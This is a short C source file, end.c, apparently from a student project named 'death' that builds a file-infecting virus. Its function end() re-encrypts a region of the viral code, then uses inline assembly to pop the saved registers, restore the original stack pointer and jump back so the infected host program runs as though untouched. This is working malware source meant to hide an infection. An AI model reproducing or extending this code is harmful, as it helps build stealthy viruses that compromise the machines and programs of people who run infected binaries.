/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   end.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:19:24 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/22 21:03:57 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "death.h"

/*
  End() redo the stack used during infection.
  it pop all registers and replace current stack ptr by original one
  the way it should normally be without any infection.
*/
void	end(t_data *data)
{
	revert_two(&data->key, (char*)erase, (size_t)end - (size_t)erase);

#ifdef DEBUG
	char log[] = "end\t\t";
	_log(log, NULL, 5, data->context);
#endif

	__asm__ __volatile__ (
		"mov	rsp, %0;"
		"pop	r15;"
		"pop	r14;"
		"pop	r13;"
		"pop	r12;"
		"pop	r11;"
		"pop	r10;"
		"pop	r9;"
		"pop	r8;"
		"pop	rcx;"
		"pop	rdx;"
		"pop	rsi;"
		"pop	rdi;"
		"pop	rax;"
		"pop	rbx;"
		"pop	rbp;"
		"pop	rsp;"
		"add	rsp, 0x8;"
		"jmp	__exit"
		:: "g"(data->rsp)
		);
}
